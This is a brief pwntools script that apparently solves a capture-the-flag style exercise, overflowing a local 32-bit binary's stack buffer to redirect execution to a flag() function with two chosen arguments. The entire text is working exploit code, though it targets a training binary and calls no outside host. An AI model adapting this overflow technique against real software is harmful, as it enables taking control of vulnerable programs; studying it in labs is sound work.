from pwn import *

p = process('./vuln-32')

payload = b'A' * 52            # Padding up to EIP
payload += p32(0x080491c7)     # Address of flag()
payload += p32(0x0)            # Return address - don't care if crashes when done
payload += p32(0xdeadc0de)     # First parameter
payload += p32(0xc0ded00d)     # Second parameter

log.info(p.clean())
p.sendline(payload)
log.info(p.clean())
